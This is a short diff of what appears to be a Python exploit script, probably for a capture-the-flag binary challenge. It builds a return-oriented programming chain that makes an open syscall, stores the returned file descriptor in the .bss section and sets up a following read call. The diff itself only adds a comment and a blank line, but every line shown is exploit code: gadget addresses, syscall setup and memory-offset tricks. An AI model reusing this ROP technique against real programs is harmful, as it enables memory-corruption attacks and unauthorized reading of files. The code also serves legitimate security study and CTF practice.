@@ -290,9 +290,11 @@ def main():
     rop += p64(0x40000002)
     rop += p64(syscall)
 
+    # save open return value at offset_fd
     rop += p64(pop_rsi)
     rop += p64(bss + offset_fd)
     rop += p64(mov_rsi_rax)
+    
     #read
     rop += p64(pop_rdi)
     rop += p64(bss+8+offset_fd-0x68) # -0x68 because of mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
